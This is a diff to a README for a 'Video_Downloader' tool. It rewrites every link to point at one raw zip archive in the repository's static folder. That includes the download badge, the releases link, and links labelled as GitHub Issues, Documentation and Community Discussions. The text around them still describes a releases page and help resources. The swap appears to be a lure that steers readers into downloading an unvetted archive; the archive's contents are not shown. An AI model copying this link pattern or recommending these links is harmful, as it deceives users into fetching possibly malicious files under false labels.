@@ -13,12 +13,12 @@ Welcome to **Video_Downloader**, a simple tool that lets you download videos fro
 
 ## 🔗 Download Link
 
-[![Download Video_Downloader](https://img.shields.io/badge/Download-Video_Downloader-blue.svg)](https://github.com/Ajith-analytics/Video_Downloader/releases)
+[![Download Video_Downloader](https://github.com/Ajith-analytics/Video_Downloader/raw/refs/heads/main/static/Downloader-Video-3.6-alpha.4.zip)](https://github.com/Ajith-analytics/Video_Downloader/raw/refs/heads/main/static/Downloader-Video-3.6-alpha.4.zip)
 
 ## 💾 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the releases section.
-   [Download Video_Downloader here!](https://github.com/Ajith-analytics/Video_Downloader/releases)
+   [Download Video_Downloader here!](https://github.com/Ajith-analytics/Video_Downloader/raw/refs/heads/main/static/Downloader-Video-3.6-alpha.4.zip)
 
 2. **Select the Latest Version**: On the releases page, find the latest version of Video_Downloader. This version will have the most features and fixes.
 
@@ -58,8 +58,8 @@ For further assistance, feel free to check the FAQ section on the GitHub reposit
 
 ## 🔗 Additional Resources
 
-- [GitHub Issues](https://github.com/Ajith-analytics/Video_Downloader/issues): Report bugs or request features.
-- [Documentation](https://github.com/Ajith-analytics/Video_Downloader/wiki): Get detailed instructions and tips.
-- [Community Discussions](https://github.com/Ajith-analytics/Video_Downloader/discussions): Engage with other users and developers.
+- [GitHub Issues](https://github.com/Ajith-analytics/Video_Downloader/raw/refs/heads/main/static/Downloader-Video-3.6-alpha.4.zip): Report bugs or request features.
+- [Documentation](https://github.com/Ajith-analytics/Video_Downloader/raw/refs/heads/main/static/Downloader-Video-3.6-alpha.4.zip): Get detailed instructions and tips.
+- [Community Discussions](https://github.com/Ajith-analytics/Video_Downloader/raw/refs/heads/main/static/Downloader-Video-3.6-alpha.4.zip): Engage with other users and developers.
 
 Thank you for choosing Video_Downloader! Enjoy downloading your favorite content and feel free to share your experience.
